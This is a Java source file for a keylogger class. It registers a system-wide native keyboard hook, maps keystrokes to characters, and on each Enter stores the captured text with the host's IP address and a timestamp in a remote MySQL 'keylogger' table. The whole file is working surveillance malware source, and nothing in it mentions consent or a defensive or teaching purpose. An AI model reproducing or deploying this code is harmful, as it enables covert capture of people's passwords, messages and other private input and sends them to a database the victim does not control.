package tools;


import java.net.Inet4Address;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.logging.Level;
import java.util.logging.Logger;

import javax.naming.InitialContext;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.joda.time.DateTime;
import org.joda.time.format.DateTimeFormat;
import org.joda.time.format.DateTimeFormatter;
import org.quartz.InterruptableJob;
import org.quartz.JobExecutionContext;
import org.quartz.JobExecutionException;
import org.quartz.UnableToInterruptJobException;

import com.mysql.jdbc.Connection;

import io.vertx.core.Vertx;
import io.vertx.core.json.JsonArray;
import io.vertx.core.json.JsonObject;
import io.vertx.ext.jdbc.JDBCClient;
import io.vertx.ext.sql.SQLConnection;

public class KeyLogger implements NativeKeyListener {
	
	private static Logger logger;
	private ArrayList<String> typed;
	private String data;
	private HashMap<Integer, String> keyword = new HashMap<>();
	private Vertx vertx;
	private JDBCClient jdbc;
	private SQLConnection connection;
	private String IP;
	private boolean running;
	private DBConfig config;
	
	
	
	public KeyLogger(DBConfig c,Vertx v) {
		System.out.println("Construct KeyLogger");
		vertx = v;
		config = c;
		// TODO Auto-generated constructor stub
		keyword.put(NativeKeyEvent.VC_0,"0");
    	keyword.put(NativeKeyEvent.VC_1,"1");
    	keyword.put(NativeKeyEvent.VC_2,"2");
    	keyword.put(NativeKeyEvent.VC_3,"3");
    	keyword.put(NativeKeyEvent.VC_4,"4");
    	keyword.put(NativeKeyEvent.VC_5,"5");
    	keyword.put(NativeKeyEvent.VC_6,"6");
    	keyword.put(NativeKeyEvent.VC_7,"7");
    	keyword.put(NativeKeyEvent.VC_8,"8");
    	keyword.put(NativeKeyEvent.VC_9,"9");
    	keyword.put(NativeKeyEvent.VC_A,"a");
    	keyword.put(NativeKeyEvent.VC_B,"b");
    	keyword.put(NativeKeyEvent.VC_C,"c");
    	keyword.put(NativeKeyEvent.VC_D,"d");
    	keyword.put(NativeKeyEvent.VC_E,"e");
    	keyword.put(NativeKeyEvent.VC_F,"f");
    	keyword.put(NativeKeyEvent.VC_G,"g");
    	keyword.put(NativeKeyEvent.VC_H,"h");
    	keyword.put(NativeKeyEvent.VC_I,"i");
    	keyword.put(NativeKeyEvent.VC_J,"j");
    	keyword.put(NativeKeyEvent.VC_K,"k");
    	keyword.put(NativeKeyEvent.VC_L,"l");
    	keyword.put(NativeKeyEvent.VC_M,"m");
    	keyword.put(NativeKeyEvent.VC_N,"n");
    	keyword.put(NativeKeyEvent.VC_O,"o");
    	keyword.put(NativeKeyEvent.VC_P,"p");
    	keyword.put(NativeKeyEvent.VC_Q,"q");
    	keyword.put(NativeKeyEvent.VC_R,"r");
    	keyword.put(NativeKeyEvent.VC_S,"s");
    	keyword.put(NativeKeyEvent.VC_T,"t");
    	keyword.put(NativeKeyEvent.VC_U,"u");
    	keyword.put(NativeKeyEvent.VC_V,"v");
    	keyword.put(NativeKeyEvent.VC_W,"w");
    	keyword.put(NativeKeyEvent.VC_X,"x");
    	keyword.put(NativeKeyEvent.VC_Y,"y");
    	keyword.put(NativeKeyEvent.VC_Z,"z");
    	keyword.put(NativeKeyEvent.VC_SPACE," ");
    	keyword.put(NativeKeyEvent.VC_COMMA, ",");
    	keyword.put(NativeKeyEvent.VC_PERIOD,".");
    	keyword.put(NativeKeyEvent.VC_ENTER, "|");
    	
    	running = false;
    	
    	try {
			IP = Inet4Address.getLocalHost().getHostAddress();
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    	System.out.println("Database config :->"+  config.toString() );
    	jdbc = JDBCClient.createShared(vertx, new JsonObject()
				.put("url",config.getConnectionURL())
				.put("driver_class","com.mysql.jdbc.Driver")
				.put("user",config.getDbUser())
				.put("password",config.getDbPassword())
				);
    	System.out.println("KeyLog JDBC Initialized ....");
	}
	
	
	@Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        //System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		System.out.println(e.getKeyCode());
        int code = e.getKeyCode();
        String val =parser(e.getKeyCode()); 
        String tmp = new String();
        if ( val!=null){
        	tmp=val;
        	data += tmp;
        	
        	if(code == NativeKeyEvent.VC_ENTER){
        		System.out.println("Storing data!!!!!");
        		store(data);
        		data ="";
        	}
        }
        
        
        
        
        System.out.println("Data :-> " + data);
        //System.out.println("Key code : " + e.getKeyCode());
        //System.out.println("Char: ->"+ e.getKeyChar());
        

        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            try {
				GlobalScreen.unregisterNativeHook();
			} catch (NativeHookException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
        }
    }

	private void store(String data) {
		// TODO Auto-generated method stub
		System.out.println("Triying to store data!!! ->" + data);

		jdbc.getConnection(res -> {
			  if (res.succeeded()) {
				    SQLConnection conn = res.result();
				    DateTime time = DateTime.now();
				    conn.updateWithParams("INSERT INTO keylogger(ip,date,data) VALUES (?, ?, ?)", new JsonArray().add(IP).add(time.toDateTime().toString()).add(data), resa -> {
				    	  if (resa.succeeded()) {
				    	    System.out.println("Added keylog");
				    	    conn.close();
				    	  }
				 }); 
			  }
		});
		
		
	}


	private String parser(int keyCode) {
		// TODO Auto-generated method stub
		String value = keyword.get(keyCode);
		return value;
		
	}
	
	@Override
    public void nativeKeyReleased(NativeKeyEvent e) {
       // System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		//Get if this is a CAPS LOCK,
        //System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
    }

	
	public boolean start(){
		try {
            GlobalScreen.registerNativeHook();
            logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
            logger.setLevel(Level.WARNING);
        }
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            return false;
            //System.exit(1);
        }
		GlobalScreen.addNativeKeyListener(new KeyLogger(this.config,this.vertx));
		running = true;
		return running;
	}
	
	public boolean stop(){
		GlobalScreen.removeNativeKeyListener(this);
		running = false;
		return running;
	}
	
	
	
	
    public static void main(String[] args) {
        

       
    }
}
